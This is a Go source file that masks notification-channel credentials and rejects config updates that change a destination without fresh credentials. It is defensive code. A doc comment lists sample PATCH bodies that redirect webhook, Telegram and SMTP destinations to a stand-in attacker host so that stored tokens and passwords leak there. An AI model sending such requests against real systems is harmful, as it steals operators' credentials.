package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix marks masked values. When the API returns credentials, it replaces
// their real values with prefixed values; on update, a prefixed value means "keep the
// stored value unchanged."
//
// A prefix rather than an empty string or fixed constant allows a small identifying
// hint (see MaskedValue), helping users distinguish bots without pasting keys again.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              original value is too short for a hint
//	"__masked__:…ab12cd"      includes the final six characters as an identifying hint
//
// Exposing only the final six characters is deliberate: identifying information for
// webhook URLs is in the last segment (e.g. WeCom keys and Feishu bot IDs), while the
// prefix is shared across bots. Six characters are not enough to reconstruct the
// credential but help users recognize the intended bot.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked (i.e. returned by the API and not changed).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of config with the channel's credential fields replaced by masked values.
//
// For an unknown channel type, return an empty map rather than the original config:
// show "config unavailable" in the UI rather than returning potentially credential-
// bearing content. Non-credential fields are preserved so the UI can display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Treat nested structures such as headers as a single credential; per-channel
		// rules for identifying credential subkeys would add more complexity than value.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials indicates that the destination changed but
// the caller did not explicitly address credential fields. Return this rather than
// silently allowing the change or discarding credentials; see PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Destination keys that changed
	Missing []string // Credential keys not explicitly addressed
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination changed (" + strings.Join(e.Changed, ", ") + "); please also update credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter new values or leave them blank to indicate that credentials are no longer needed. " +
		"Existing credentials are valid only for the old destination; reusing them would send them to the new destination."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of a destination change.
//
// It replaces MergeConfig on channel-update paths and addresses this demonstrated
// scenario: destination (where a message is sent) and credentials (which identity is
// used) are separate fields, while MergeConfig preserves stored values for unmentioned
// keys. Anyone who can PATCH channel config could **change only the destination and
// omit credentials**, causing the server to send stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}} -> send the original Authorization header in the request
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<real-token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}       -> disclose username/password after STARTTLS
//
// This path is silent and does not depend on redirects (so rejecting cross-host
// redirects does not stop it). It also defeats this package's masking goal: credentials
// should not be returned to the browser.
//
// Rule: whenever a destination key changes, the caller must explicitly address
// **every** credential key:
//   - Provide a new value -> use it.
//   - Explicitly pass an empty string -> the field no longer needs a credential (preserve clear semantics).
//   - Return a masked value unchanged or omit the key -> reject.
//
// The third case is rejected because a masked value means "reuse the old credential,"
// which is valid only for the old destination. Do not automatically discard
// credentials: optional fields (Webhook headers, email password) could silently lose
// authentication while the API returns 200, which is harder to diagnose than an error.
// It is better to ask the operator to enter them again.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// A mask literal nested inside a non-string credential value (e.g. a webhook headers
	// object) means the caller put the "keep stored value" sentinel inside a structure.
	// MergeConfig recognizes masks only as prefixed strings, so this would be stored as
	// an ordinary object, persisting the literal "__masked__" and silently breaking
	// authentication. Reject it.
	//
	// This check must run **first**: unchanged destinations take an early return, so a
	// later check would cover only destination-change paths (an earlier version did
	// exactly that, and the test caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find destination keys that actually changed. A masked value means unchanged.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Destination unchanged: perform a normal merge (preserve masked values, clear empty strings, overwrite the rest).
		return MergeConfig(stored, incoming), nil
	}

	// Destination changed: require an explicit value for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects mask sentinels nested inside non-string structures.
//
// Masking assumes the entire value is a string. Object fields such as webhook headers
// must be masked as a whole (the string "__masked__") or submitted as a whole; a
// nested sentinel cannot mean "keep unchanged" and would be stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: submit the entire field blank to keep its current value, or submit a new value; masked placeholders cannot be embedded in an object",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialization also
// handles type differences: the frontend submits ports as numbers, while database
// values are decoded as float64, so direct == comparison can be wrong.
//
// Normalize empty values first: in this config model, an empty string and a missing key
// represent the same state because MergeConfig treats an empty string as an explicit
// clear and deletes the key. Without normalization, an optional destination field left
// empty (Telegram base_url is the only one; empty means use the official address) would
// follow this path:
//
//	Creation stores base_url:"" -> first save deletes the key via MergeConfig.
//	-> On second save, incoming is "" and stored has no key, so the destination appears to have changed.
//	-> Credential is masked -> 400 "Destination changed; resubmit credentials."
//
// Every subsequent save then fails unless the user pastes the Bot Token again, despite having changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a config value is blank.
// Its definition must match MergeConfig (strings.TrimSpace(s) == ""), or a value could
// be considered blank by MergeConfig but nonempty by sameConfigValue.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming config over stored config during channel updates.
//
// Rules:
//   - A masked value in incoming -> keep the stored value (the user did not change this field).
//   - An empty string in incoming -> explicitly clear and delete the key.
//   - Any other value -> overwrite with the incoming value.
//   - A key in stored but not incoming -> preserve it (partial-update semantics).
//
// The meaning of an empty string must be explicit: frontend forms submit empty strings
// for blank fields, and treating them as values could clear fields users intended to
// leave unchanged. Here they mean explicit clearing, since users otherwise have no way
// to remove a misconfigured field (omitting a field could distinguish "not provided"
// from "empty value," but the UI does not need that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Masked value means unchanged; preserve stored value.
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
